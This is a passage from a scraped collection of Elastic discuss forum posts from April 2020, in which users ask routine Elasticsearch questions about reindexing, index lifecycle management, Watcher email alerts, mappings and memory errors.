    "body": "Hello I am trying to reindex about 3mil documents (~50gb) trough an ingestion pipeline. POST _reindex?&wait_for_completion=false { \"source\": { \"size\": 1, \"index\": \"src\" }, \"dest\": { \"index\": \"dst\" \"pipeline\": \"reindex_pipeline\" } } As you can see, I already tried lower batch sizes (even down to one) but as the pipeline is doing some heavy computations, it seems at least one document is causing a scroll context to become invalid. Is there any other way (besides lowering batch size) to fight this? org.elasticsearch.action.search.SearchPhaseExecutionException: all shards failed ... Caused by: org.elasticsearch.transport.RemoteTransportException: [node name][127.0.0.1:9300][indices:data/read/search[phase/query+fetch/scroll]] ... Caused by: org.elasticsearch.search.SearchContextMissingException: No search context found for id [...] (Single Node running ES6.7)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3f0bdb6a-7725-4f42-a26a-6131c5cb26ce",
    "url": "https://discuss.elastic.co/t/case-insensitive-path-in-match-query/229192",
    "title": "Case insensitive path in match query",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jogi_Michal",
    "date": "April 22, 2020, 6:55am",
    "body": "Hi folks, I have a problem with case sensitivity in field path... My mapping is dynamic: ... \"http_headers\": { \"dynamic\": true, \"properties\": { \"content-length\": { \"type\": \"long\" } }, ... so I have in there documents with fields with different cases: [...].http_headers.User-Agent [...].http_headers.User-agent [...].http_headers.user-agent My question is if there is a way of searching (match query) by the lowercase one and get results for all of them? Is there a possibility to search by case insensitive field path? Thanks in advance, Cheers",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "e65b9d3d-da72-46a3-9ea8-4bacee599ab4",
    "url": "https://discuss.elastic.co/t/elasticsearch-output-with-alias/228869",
    "title": "ElasticSearch output with alias",
    "category": [
      "Elasticsearch"
    ],
    "author": "Julien1",
    "date": "April 20, 2020, 1:15pm April 22, 2020, 8:45am April 22, 2020, 6:49am",
    "body": "Hello, Do we have to configure manualy first time index name in Elasticsearch output ? Let me explain, the context is : I create a index named : index: \"es_on_demand_index-000001\" I have an index Lifecycle Policies like this : { \"policy\": \"policy_exlabel\", \"phase_definition\": { \"min_age\": \"0ms\", \"actions\": { \"rollover\": { \"max_size\": \"5mb\", \"max_age\": \"3d\" }, \"set_priority\": { \"priority\": 100 } } }, When index is create, I create an alias manualy (alias es_on_demand), I stop Filebeat's service, I change Elasticsearch output by the alias name : index: \"es_on_demand\" I start Filebeat's service, and when conditions of my ILM are true, a new index is create : es_on_demand_index-000002 and logs points to the right index. My question is : Can I create the first time, a alias who points a pattern index even if the index is not created yet ? Thanks for your help",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "53bdfc1f-34b2-4684-8020-5e98b24491f8",
    "url": "https://discuss.elastic.co/t/switching-off-security-to-install-the-platinum-license/229183",
    "title": "Switching off security to install the platinum license",
    "category": [
      "Elasticsearch"
    ],
    "author": "rgelb",
    "date": "April 22, 2020, 6:20am April 22, 2020, 7:27am",
    "body": "I am trying to install a license in Kibana via Management / Elasticsearch / License Management. It tells me Error encountered uploading license: Cannot install a [PLATINUM] license unless TLS is configured or security is disabled Since I have no security currently and I can just hit the cluster, I'd like to disable security on my 3 node cluster. The following page says that I need to set xpack.security.enabled: false on all nodes. Does that mean that I need to locate elasticsearch.yml file on each node and set the setting to false? And then restart the cluster. Is there more to it or this is all? Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a9c820e4-af48-4a35-8696-d54242db691f",
    "url": "https://discuss.elastic.co/t/json-parse-exception-unrecognized-token-analytics-query/228344",
    "title": "Json_parse_exception - Unrecognized token 'analytics_query'",
    "category": [
      "Elasticsearch"
    ],
    "author": "ank-patel",
    "date": "April 16, 2020, 2:54pm April 20, 2020, 2:46am April 22, 2020, 6:36am",
    "body": "I am using below command to get details about number of API calls for Product \"IBM API Connect - kubernetes version\" : Command : kubectl exec -it r480b58da7f-analytics-storage-coordinating-7fc6b48b74-dq6f5 -n apic-analyt -- curl_es /apic-api-r/_search?pretty -d 'analytics_query' -H 'Content-Type: application/json' Response Output : { \"error\" : { \"root_cause\" : [ { \"type\" : \"json_parse_exception\", \"reason\" : \"Unrecognized token 'analytics_query': was expecting ('true', 'false' or 'null')\\n at [Source: org.elasticsearch.transport.netty4.ByteBufStreamInput@735d0ec1; line: 1, column: 31]\" } ], \"type\" : \"json_parse_exception\", \"reason\" : \"Unrecognized token 'analytics_query': was expecting ('true', 'false' or 'null')\\n at [Source: org.elasticsearch.transport.netty4.ByteBufStreamInput@735d0ec1; line: 1, column: 31]\" }, \"status\" : 500 } The analytics_query i used is as below: '{ \"size\": 0, \"query\": { \"range\": { \"datetime\": { \"gte\": \"now-1d/d\", \"lt\": \"now/d\" } } }, \"aggs\": { \"status_codes\": { \"filters\": { \"filters\": { \"1xx\": { \"regexp\": { \"status_code\": \"1.*\" } }, \"2xx\": { \"regexp\": { \"status_code\": \"2.*\" } }, \"3xx\": { \"regexp\": { \"status_code\": \"3.*\" } }, \"4xx\": { \"regexp\": { \"status_code\": \"4.*\" } }, \"5xx\": { \"regexp\": { \"status_code\": \"5.*\" } } } } } } }'",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "369ff2e4-b6ac-42c0-a020-dd7ba0cbb91d",
    "url": "https://discuss.elastic.co/t/trigger-on-insert-to-index/229113",
    "title": "Trigger on insert to index",
    "category": [
      "Elasticsearch"
    ],
    "author": "somethingcool",
    "date": "April 21, 2020, 5:51pm April 21, 2020, 6:22pm April 21, 2020, 6:28pm April 21, 2020, 6:30pm April 21, 2020, 6:33pm April 21, 2020, 6:37pm April 21, 2020, 6:44pm April 21, 2020, 6:46pm April 21, 2020, 7:39pm April 21, 2020, 8:04pm April 22, 2020, 5:00am",
    "body": "Hello, I am using elasticsearch 6.8 and I couldn't find anything directly to this question, but was curious to know if it is possible to call an external python script after the insert of data into an index. If it is possible, could someone point me to the resources so that I could learn more about the available tools to make that happen.",
    "website_area": "discuss",
    "replies": 11
  },
  {
    "id": "d3187e8a-4f75-4f06-abab-679cfbf99402",
    "url": "https://discuss.elastic.co/t/index-elasticsearch/229015",
    "title": "Index elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "Jorge_Aragon",
    "date": "April 21, 2020, 10:36am April 21, 2020, 10:08pm April 22, 2020, 4:56am",
    "body": "I am using elasticsearch 7.6 and everything works fine, but wordpress requires elasticsearch 7.5 for elasticpress when I use elasticshear 7.5 it does not recognize my index. this iselastic 7.5 [2020-04-21T12:18:43,868][INFO ][o.e.g.GatewayService ] [mey] recovered [0] indices into cluster_state and elastic 7.6 [2020-04-21T10:43:13,913][INFO ][o.e.c.r.a.AllocationService] [mey] Cluster health status changed from [RED] to [YELLOW] (reason: [shards started [[backaihfcom-post-1][2], [aihf][0]]]).",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "874274e4-515f-42ec-bf6d-7bebf5af295b",
    "url": "https://discuss.elastic.co/t/issue-about-index-lifecycle-management/228981",
    "title": "Issue about index lifecycle management",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 4:12am April 21, 2020, 10:18pm April 22, 2020, 4:06am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7bf39097-d0cb-4660-a89e-020a1bf96cfe",
    "url": "https://discuss.elastic.co/t/watcher-question/229168",
    "title": "Watcher Question",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 4:01am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "19ab906f-3556-40ff-9ce7-df9cab0cc4be",
    "url": "https://discuss.elastic.co/t/top-match-in-category/229114",
    "title": "Top match in category",
    "category": [
      "Elasticsearch"
    ],
    "author": "emarthinsen",
    "date": "April 21, 2020, 6:04pm April 22, 2020, 2:50am",
    "body": "Say I have an online bookstore. If someone searches for \"dinosaur\", I want to return the top 3 matches in fiction, non-fiction, and reference categories. Is this possible with a single query in ES, or would I need to issue a separate query for each category?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "16fd8ae5-849a-4c5f-b662-ea30fc6f3193",
    "url": "https://discuss.elastic.co/t/elasticsearch-functionbeat-setup-is-giving-me-a-failed-to-connect-to-backoff-elastisearch-http-localhost-9200/229115",
    "title": "ElasticSearch + FunctionBeat setup is giving me a \"Failed to connect to backoff (elastisearch(http://localhost:9200))\"",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 22, 2020, 2:33am",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d47057af-82f0-48b3-8fcf-afcd491955c5",
    "url": "https://discuss.elastic.co/t/the-official-documentation-on-testing-has-been-deleted/229153",
    "title": "The official documentation on testing has been deleted?",
    "category": [
      "Elasticsearch"
    ],
    "author": "finn-wa",
    "date": "April 22, 2020, 1:25am April 22, 2020, 1:30am",
    "body": "https://www.elastic.co/guide/en/elasticsearch/reference/current/testing.html All of the pages in the testing section of the documentation say \"This page was deleted.\" They definitely existed yesterday. What happened?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "6426444a-d6cf-4b82-80ee-33e1afcafb78",
    "url": "https://discuss.elastic.co/t/ilm-questions-how-to-delete-indexes-based-daily-referenced-to-timestamp/229026",
    "title": "ILM questions: How to delete indexes based daily referenced to @timestamp?",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 21, 2020, 10:17pm April 21, 2020, 10:17pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d0024864-fc9d-4454-9233-f67a60959687",
    "url": "https://discuss.elastic.co/t/how-to-compare-the-cost-of-search-request/228881",
    "title": "How to compare the cost of Search Request",
    "category": [
      "Elasticsearch"
    ],
    "author": "jeffzhao",
    "date": "April 20, 2020, 2:15pm April 21, 2020, 10:10pm",
    "body": "Hi, I want to optimize index settings, for example, customized _routing parameter, to see if it can improve search performance. The problem is Elasticsearch always cache the query result, so when I run the search for the second time, it's much faster than the first time. I can't baseline the search performance. I tried clear cache but it didn't help. If the execution time of the search can't tell me whether optimization works, are there any other statistics that I can check? In relational database I can check the EXECUTION PLAN to find the cost of each step. Can I do similar thing in Elasticsearch to find the cost of each Search request? For my example customized _routing parameter, I can see the number of shards hit has reduced. But this is not enough to prove the performance has improved.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "2d559361-71a4-4ddd-ac6b-4f63695ce4e8",
    "url": "https://discuss.elastic.co/t/cant-send-mail-alert-through-watcher/229011",
    "title": "Cant send mail alert through watcher",
    "category": [
      "Elasticsearch"
    ],
    "author": "rakeshraagu2",
    "date": "April 21, 2020, 10:19am April 21, 2020, 10:22am April 21, 2020, 10:23am April 21, 2020, 10:25am April 21, 2020, 11:42am April 21, 2020, 10:00pm",
    "body": "Hi, When I testing my mail alert using watcher it is showing an error that mail send failed. In my cluster log file I saw below given line. Can anyoone help. ][ERROR][o.e.x.w.a.e.ExecutableEmailAction] [elk-master] failed to execute action [inlined/email_1] javax.mail.MessagingException: failed to send email with subject [Watch [filebeat] has exceeded the threshold] via account [gmail_account]",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "e4412092-059b-4a47-8a66-9a449d3485fd",
    "url": "https://discuss.elastic.co/t/ilm-and-automatic-bootstrap/229053",
    "title": "ILM and automatic bootstrap?",
    "category": [
      "Elasticsearch"
    ],
    "author": "asp",
    "date": "April 21, 2020, 1:29pm April 21, 2020, 9:59pm",
    "body": "Hi, I am struggling with ILM. I want to find out if I can change our environment to use it. Currently we have two fields in our events, which are used for creating the index: logType (defines the part of the application which logged the event (e.g. session, timer, http, ...) stage (defines the stage of the system (e.g. dev, staging, prod, ...) Logstash is currently calculating the index pattern like this: <stage>-<logType>-<YYYY.MM.DD>. This results in index names like staging-session-2020.04.20 So currently install new stages or define new logTypes in our application, the splitting to new indices is plug and play, so nothing to do in elasticsearch or logstash. Thats nice. But if I understand correctly, I need to bootstrap indices for using ILM, that means I have to know all stage and logType combinations before they are inserted via logstash. Is that correct? Is there any way to bootstrap it automatically and set staging-session-2020.04.20 or at least staging-session as alias automatically? Thanks a lot, Andreas",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "d163f998-8e01-474e-9404-64ee43a62974",
    "url": "https://discuss.elastic.co/t/elastic-cloud-6-8-8-saml-settings-rejected/229112",
    "title": "Elastic Cloud 6.8.8 SAML settings rejected",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 21, 2020, 9:48pm April 21, 2020, 9:56pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c269e122-fec5-4528-8be3-462a80c77b2c",
    "url": "https://discuss.elastic.co/t/cant-able-to-send-mail-from-watcher/229131",
    "title": "Cant able to send mail from watcher",
    "category": [
      "Elasticsearch"
    ],
    "author": "rakeshraagu2",
    "date": "April 21, 2020, 8:56pm",
    "body": "Hi All, Iam trying to send alert mail from watcher but failed to send mail. Iam using a gmail account. This is the error message i gets from cluster log [2020-04-22T02:20:37,420][ERROR][o.e.x.w.a.e.ExecutableEmailAction] [elk-master] failed to execute action [inlined/email_1] javax.mail.MessagingException: failed to send email with subject [Watch [test] has exceeded the threshold] via account [gmail_account] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:171) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:163) ~[?:?] at org.elasticsearch.xpack.watcher.actions.email.ExecutableEmailAction.execute(ExecutableEmailAction.java:76) ~[?:?] at org.elasticsearch.xpack.core.watcher.actions.ActionWrapper.execute(ActionWrapper.java:164) [x-pack-core-7.6.2.jar:7.6.2] at org.elasticsearch.xpack.watcher.execution.ExecutionService.executeInner(ExecutionService.java:534) [x-pack-watcher-7.6.2.jar:7.6.2] at org.elasticsearch.xpack.watcher.execution.ExecutionService.execute(ExecutionService.java:320) [x-pack-watcher-7.6.2.jar:7.6.2] at org.elasticsearch.xpack.watcher.transport.actions.execute.TransportExecuteWatchAction$1.doRun(TransportExecuteWatchAction.java:159) [x-pack-watcher-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37) [elasticsearch-7.6.2.jar:7.6.2] at org.elasticsearch.xpack.watcher.execution.ExecutionService$WatchExecutionTask.run(ExecutionService.java:627) [x-pack-watcher-7.6.2.jar:7.6.2] at org.elasticsearch.common.util.concurrent.ThreadContext$ContextPreservingRunnable.run(ThreadContext.java:633) [elasticsearch-7.6.2.jar:7.6.2] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) [?:?] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) [?:?] at java.lang.Thread.run(Thread.java:830) [?:?] Caused by: com.sun.mail.util.MailConnectException: Couldn't connect to host, port: smtp.gmail.com, 587; timeout 120000 at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:2209) ~[?:?] at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:722) ~[?:?] at javax.mail.Service.connect(Service.java:342) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.lambda$executeConnect$2(Account.java:161) ~[?:?] at java.security.AccessController.doPrivileged(AccessController.java:554) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.executeConnect(Account.java:160) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.send(Account.java:119) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:169) ~[?:?] ... 12 more Caused by: java.net.ConnectException: Connection refused at sun.nio.ch.Net.pollConnect(Native Method) ~[?:?] at sun.nio.ch.Net.pollConnectNow(Net.java:579) ~[?:?] at sun.nio.ch.NioSocketImpl.timedFinishConnect(NioSocketImpl.java:549) ~[?:?] at sun.nio.ch.NioSocketImpl.connect(NioSocketImpl.java:597) ~[?:?] at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:339) ~[?:?] at java.net.Socket.connect(Socket.java:603) ~[?:?] at com.sun.mail.util.WriteTimeoutSocket.connect(WriteTimeoutSocket.java:91) ~[?:?] at com.sun.mail.util.SocketFetcher.createSocket(SocketFetcher.java:333) ~[?:?] at com.sun.mail.util.SocketFetcher.getSocket(SocketFetcher.java:214) ~[?:?] at com.sun.mail.smtp.SMTPTransport.openServer(SMTPTransport.java:2160) ~[?:?] at com.sun.mail.smtp.SMTPTransport.protocolConnect(SMTPTransport.java:722) ~[?:?] at javax.mail.Service.connect(Service.java:342) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.lambda$executeConnect$2(Account.java:161) ~[?:?] at java.security.AccessController.doPrivileged(AccessController.java:554) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.executeConnect(Account.java:160) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.Account.send(Account.java:119) ~[?:?] at org.elasticsearch.xpack.watcher.notification.email.EmailService.send(EmailService.java:169) ~[?:?] ... 12 more configuration file for elasticsearch xpack.notification.email.account: gmail_account: profile: gmail email_defaults: from: raagurakesh765@gmail.com smtp: auth: true starttls.enable: true host: smtp.gmail.com port: 587 user: gmail-id password key stored using, sudo ./elasticsearch-keystore add xpack.notification.email.account.my-gmail-id.smtp.secure_password pls help. Is there anything missing from the configuration?.... Thanks in advance.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "62b89f08-dc66-49ef-859a-8ac62707e4a7",
    "url": "https://discuss.elastic.co/t/migrating-from-1-1-1-to-7-6-0/229126",
    "title": "Migrating from 1.1.1 to 7.6.0",
    "category": [
      "Elasticsearch"
    ],
    "author": "RyanUI",
    "date": "April 21, 2020, 8:13pm April 21, 2020, 8:33pm April 21, 2020, 8:43pm",
    "body": "I have an older cluster (by old I mean 1.1.1) that has been doing exactly what it's needed to be doing.. Working. I've been meaning to upgrade it for a while now but time just got away from me! the data isn't that large.. only a few gigs. but my question is.. What would be the fastest way to get this done? It's only one table / endpoint that needs exported.. And if it's not possible to do since it's so old.. I'll just end up re creating the db from the raw data.. Read up on snapshots but read it as I can't do this because it's several versions old.. so wondering if there was another way. thanks! R",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "5f6e4f50-b6d8-410f-852f-5c7633dbb098",
    "url": "https://discuss.elastic.co/t/node-ips-in-the-cluster-does-not-changed-when-the-host-system-ips-already-changed/228949",
    "title": "Node IPs in the cluster does not changed when the host/system IPs already changed",
    "category": [
      "Elasticsearch"
    ],
    "author": "worapojc",
    "date": "April 21, 2020, 3:30am April 21, 2020, 6:19am April 21, 2020, 7:29am April 21, 2020, 8:33pm",
    "body": "Hello Elasticsearch team, I'm using Elasticsearch 1.7, here is the _cat/nodes response. curl -s localhost:9200/_cat/nodes data_node_1 10.255.70.31 14 54 1.98 d - data_node_1.instance.3 master_node_1 159.42.11.42 2 14 0.02 - m master_node_1.instance.1 data_node_2 10.255.70.32 43 54 4.71 d - data_node_2.instance.1 data_node_3 10.255.70.33 69 53 2.04 d - data_node_3.instance.2 query_node_1 159.42.11.48 1 22 0.07 - - query_node_1.instance.1 data_node_1 10.255.70.31 60 54 1.98 d - data_node_1.instance.1 data_node_3 10.255.70.33 35 53 2.04 d - data_node_3.instance.3 data_node_3 10.255.70.33 65 53 2.04 d - data_node_3.instance.4 data_node_3 10.255.70.33 55 53 2.04 d - data_node_3.instance.1 data_node_2 10.255.70.32 28 54 4.71 d - data_node_2.instance.4 data_node_1 10.255.70.31 40 54 1.98 d - data_node_1.instance.2 data_node_2 10.255.70.32 45 54 4.71 d - data_node_2.instance.2 query_node_2 159.42.11.47 1 22 0.05 - - query_node_2.instance.1 master_node_2 159.42.11.43 0 14 0.14 - * master_node_2.instance.1 data_node_1 10.255.70.31 68 54 1.98 d - data_node_1.instance.4 data_node_2 10.255.70.32 25 54 4.77 d - data_node_2.instance.3 master_node_3 159.42.11.44 2 14 0.01 - m master_node_3.instance.1 However, the data node IPs have been changed from 10.255.x.x to 159.42.x.x. I did full rolling restart but the IPs from _cat/nodes have not been changed. I guess it might have a cache at the Elasticsearch level. How do I fix this issue? Regards, Worapoj",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3bfff078-54c0-490d-b953-75b75099314a",
    "url": "https://discuss.elastic.co/t/how-to-change-type-of-field-from-geo-point-to-text/228964",
    "title": "How to change type of field from Geo_Point to Text?",
    "category": [
      "Elasticsearch"
    ],
    "author": "umay_fb",
    "date": "April 21, 2020, 5:31am April 21, 2020, 6:25am April 21, 2020, 6:27am April 21, 2020, 7:35am April 21, 2020, 8:33pm",
    "body": "hey all, I have a problem, I put data into elastic type geo_point but the data had value \"NaN, NaN\" and 999,999. I get an error like : ''' type: 'mapper_parsing_exception', reason: 'failed to parse the [destinationLongLat] field of type [geo_point]', caused_by: [Object]}, operation: {index: [Object] ''' How change the data type of an existing index from geo_point to text?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "3eb1612f-7b41-4050-945d-46371f95d4de",
    "url": "https://discuss.elastic.co/t/curator-to-reach-elasticsearch-accessible-via-ingress/229119",
    "title": "Curator to reach elasticsearch accessible via ingress?",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 21, 2020, 6:29pm April 21, 2020, 8:13pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "ee166335-a1af-4680-8335-b724ba493d27",
    "url": "https://discuss.elastic.co/t/malformed-query/228865",
    "title": "Malformed Query",
    "category": [
      "Elasticsearch"
    ],
    "author": "hariskhalique",
    "date": "April 20, 2020, 12:47pm April 21, 2020, 6:37pm",
    "body": "Hi, I am running following query. GET products/_search { \"size\": 0, \"aggs\": { \"products\": { \"terms\": { \"field\": \"product_id\", \"size\": 10 },\"aggs\": { \"result\": { \"top_hits\": { \"size\": 1, \"_source\": {\"includes\": []} } } } } }, \"query\": { \"bool\": { \"must\": [ { \"multi_match\": { \"query\": \"top\" } } ], \"filter\": { \"script\": { \"script\": { \"source\": \"doc['display_product_color_id'].value == doc['color_id'].value\", \"lang\": \"painless\" } } , \"and\": { \"filters\": [ { \"script\": { \"script\": { \"source\": \"doc['image_src'].value != ''\", \"lang\": \"painless\" } } } ] } } } } } I am getting following error [script] malformed query, expected [END_OBJECT] but found [FIELD_NAME] thanks",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c3ce8a1e-6672-403a-b732-32e3ed64a2ec",
    "url": "https://discuss.elastic.co/t/book-elasticsearch-in-action/229116",
    "title": "Book: ElasticSearch in Action",
    "category": [
      "Elasticsearch"
    ],
    "author": "emarthinsen",
    "date": "April 21, 2020, 6:10pm April 21, 2020, 6:29pm",
    "body": "Is the book \"ElasticSearch in Action\" still relevant? It was published back in 2015, so it's a solid 5 years old - which is ages in the software world. I'm looking for a book that will get me deeper into understanding ES and what's I've read of the book makes me think it would do this. I'm just concerned that it would be out-of-date. Most other books on ES are either just as old, get bad reviews, or are published by Packt (who publishes exceptionally low-quality books). So, if anyone has another resource, I'm all ears.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "4165a8d5-80be-48bc-b942-e4f2b26713f3",
    "url": "https://discuss.elastic.co/t/getting-named-groups-from-pattern-tokenizer/229107",
    "title": "Getting Named Groups from pattern tokenizer",
    "category": [
      "Elasticsearch"
    ],
    "author": "HAKSOAT",
    "date": "April 21, 2020, 5:34pm",
    "body": "I am currently making use of the Pattern tokenizer to specify my own regex for extracting tokens. I have named groups in the regex, and I have no idea how I can extract them from the returned tokens.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "57c0bc42-1b4b-4c25-925d-3c72f8a605ed",
    "url": "https://discuss.elastic.co/t/manually-delete-old-logs-indices-in-elk-7-3-0/227981",
    "title": "Manually delete old logs/indices in ELK 7.3.0",
    "category": [
      "Elasticsearch"
    ],
    "author": "mohamed.samir",
    "date": "April 14, 2020, 6:55pm April 21, 2020, 2:08pm April 21, 2020, 3:29pm April 21, 2020, 5:32pm",
    "body": "please, how to delete old logs/indices or in ELK 7.3 before i used to use curl -GET http://localhost:9200/_cat/indices to see old indices and delete it manually using curl -XDELETE http://localhost:9200/logstash-2020.01.* but now, when i use curl -GET http://localhost:9200/_cat/indices i got a bulk of one row data (all size 120G) like this one yellow open logstash 4KcX1ncGRgSwIL9Ow0yE_g 1 1 113013399 0 120.6gb 120.6gb any idea how to delete old logs manually please, like before?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "eb83371c-0daa-421b-a609-6865222309cb",
    "url": "https://discuss.elastic.co/t/command-to-find-elasticsearch-python-client-version/229101",
    "title": "Command to find elasticsearch python client version",
    "category": [
      "Elasticsearch"
    ],
    "author": "chari",
    "date": "April 21, 2020, 4:58pm April 21, 2020, 5:13pm April 21, 2020, 5:27pm",
    "body": "how do i find what version of elasticsearch python client i am running ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4ed6e395-df4c-4f36-8b2f-64f2491af0a0",
    "url": "https://discuss.elastic.co/t/sink-the-output-of-an-sql-query-back-into-an-index-in-elasticsearch/229087",
    "title": "Sink the output of an SQL Query back into an index in Elasticsearch",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rahul_Kumar4",
    "date": "April 21, 2020, 3:57pm",
    "body": "Hello, Is it possible to write the output data of an SQL query result back into a new index in Elasticsearch? I have two indices and have to perform JOIN operations to denormalize it but after that I want to write the output to a new index to query it later. Is the sinking possible?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "49665c89-2e60-4493-9cdc-9b637636961b",
    "url": "https://discuss.elastic.co/t/elastic-slm-retention-doesnt-work/228973",
    "title": "Elastic slm retention doesn't work",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 21, 2020, 6:27am April 21, 2020, 3:47pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "958436d6-7cfb-4643-b819-400f75cd1b68",
    "url": "https://discuss.elastic.co/t/recommendation-for-custom-authentication/224265",
    "title": "Recommendation for custom authentication",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "March 19, 2020, 12:52pm March 19, 2020, 2:16pm March 24, 2020, 7:09pm March 31, 2020, 5:18pm April 21, 2020, 1:34pm April 21, 2020, 3:25pm April 21, 2020, 3:45pm",
    "body": "",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "62141611-7ef6-4258-9dce-bc316d09a464",
    "url": "https://discuss.elastic.co/t/insert-object-using-java-client-6-5/229084",
    "title": "Insert object using java client 6.5",
    "category": [
      "Elasticsearch"
    ],
    "author": "Mohamed",
    "date": "April 21, 2020, 3:44pm",
    "body": "Hello, I want to insert an object using java high level rest client. My mapping is the following: \"images\":{ \"type\":\"nested\", \"properties\":{ \"name\":{ \"type\":\"text\" }, \"url\":{ \"type\":\"text\" } } } and java code: > //productDb.getImages() returns ArrayList of type Image: with attributes \"name\" and \"url\" productToIndex.put(\"images\", new Gson().toJson(productDb.getImages())); IndexRequest indexRequest = new IndexRequest(ProductIndex.PRODUCT_INDEX, ProductIndex.TYPE) .source(productToIndex, XContentType.JSON); try { restHighLevelClient.index(indexRequest, RequestOptions.DEFAULT); } catch (Exception e) { logger.error(\"Data access error occured the entity persistence...\", e); throw new Exception(e); } The error is: ElasticsearchStatusException[Elasticsearch exception [type=mapper_parsing_exception, reason=object mapping for [images] tried to parse field [images] as object, but found a concrete value]] The concrete value: images -> [{\"name\":\"Capture.PNG\",\"url\":\"/api/trader/files/2132132/Capture.PNG\"},{\"name\":\"payement.jpg\",\"url\":\"/api/trader/files/31231321/payement.jpg\"}] ==> For me it seems OKay and I cannot understand why it returns an exception, if I replace productDb.getImages() with new Arraylist<>(); it works fine ! I cannot find an example of how to index arrays object using java, is there a solution to do it ? Thanks.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "1b273924-cb41-4cc2-9d06-e3919fc33482",
    "url": "https://discuss.elastic.co/t/circuitbreakingexception-parent-data-too-large-in-7-4-2/229082",
    "title": "CircuitBreakingException [parent] Data too large in 7.4.2",
    "category": [
      "Elasticsearch"
    ],
    "author": "engstrom",
    "date": "April 21, 2020, 3:28pm April 21, 2020, 3:29pm",
    "body": "I'm hoping someone can help me understand what is causing this exception. This is being thrown frequently, both while writing to and reading from the cluster. Here's an example error I received while running GET /_cat/indices?v in Kibana: { \"error\": { \"root_cause\": [ { \"type\": \"circuit_breaking_exception\", \"reason\": \"[parent] Data too large, data for [<http_request>] would be [4075745992/3.7gb], which is larger than the limit of [4063657984/3.7gb], real usage: [4075745992/3.7gb], new bytes reserved: [0/0b], usages [request=0/0b, fielddata=8989/8.7kb, in_flight_requests=0/0b, accounting=1803266/1.7mb]\", \"bytes_wanted\": 4075745992, \"bytes_limit\": 4063657984, \"durability\": \"PERMANENT\" } ], \"type\": \"circuit_breaking_exception\", \"reason\": \"[parent] Data too large, data for [<http_request>] would be [4075745992/3.7gb], which is larger than the limit of [4063657984/3.7gb], real usage: [4075745992/3.7gb], new bytes reserved: [0/0b], usages [request=0/0b, fielddata=8989/8.7kb, in_flight_requests=0/0b, accounting=1803266/1.7mb]\", \"bytes_wanted\": 4075745992, \"bytes_limit\": 4063657984, \"durability\": \"PERMANENT\" }, \"status\": 429 } My cluster has 3 master nodes and 3 data nodes. The cluster has 2 indexes and each index has 2 shards (with replica count set to 1). From what I've read, this error indicates that I've reached 95% heap usage on at least one node. But when I add up the usage from the circuit breakers (request + fielddata + in_flight_requests + accounting), they never total more than ~20mb. So something else must be responsible for the memory usage. I noticed that the cluster was in yellow status which I narrowed down to an allocation failure assigning replicas to the units2 index. I removed the replicas which caused the cluster status to return to green and I stopped seeing errors for a while. This made me think that replication was using too much memory and causing the issue. To test this theory, I let the cluster run overnight without the replicas. Unfortunately this morning I found thousands of new CircuitBreakingExceptions. I'm not sure what to look at next and 